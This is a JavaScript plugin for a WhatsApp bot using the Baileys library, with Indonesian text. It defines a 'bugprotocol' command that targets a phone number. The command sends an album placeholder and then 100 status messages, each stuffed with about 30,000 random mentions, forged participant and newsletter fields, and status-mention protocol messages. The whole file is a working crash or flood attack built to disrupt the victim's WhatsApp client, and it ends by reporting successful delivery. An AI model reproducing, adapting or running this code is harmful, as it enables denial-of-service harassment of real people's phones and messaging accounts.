// 📝 plugin bug - bugprotocol

// 📝 plugin bug - bugprotocol

const { generateWAMessageFromContent, generateWAMessage } = require('@whiskeysockets/baileys');
const axios = require('axios');

// ✅ Ganti URL rusak dengan yang valid
const getImageBuffer = async () => {
  const res = await axios.get('https://files.catbox.moe/2t6m0g.jpeg', { responseType: 'arraybuffer' });
  return Buffer.from(res.data);
};

async function protocolbug8(client, target, mention) {
  const buffer = await getImageBuffer();

  const photo = {
    image: buffer,
    caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 100,
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: client.waUploadToServer
  });

  await client.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 100; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: client.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 700000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Cilayy Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await client.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

let handler = async (m, { conn, text, command }) => {
  if (!text) return m.reply(`Contoh:\n*${command} 62xxxxxxxxxx*`);
  const target = text.replace(/\D/g, '') + '@s.whatsapp.net';
  await protocolbug8(conn, target, true);
  m.reply('✅ Bug Protocol berhasil dikirim ke: ' + target);
};

handler.command = /^bugprotocol$/i;
handler.tags = ['bug'];
handler.help = ['bugprotocol <nomor>'];
handler.rowner = true;

module.exports = handler;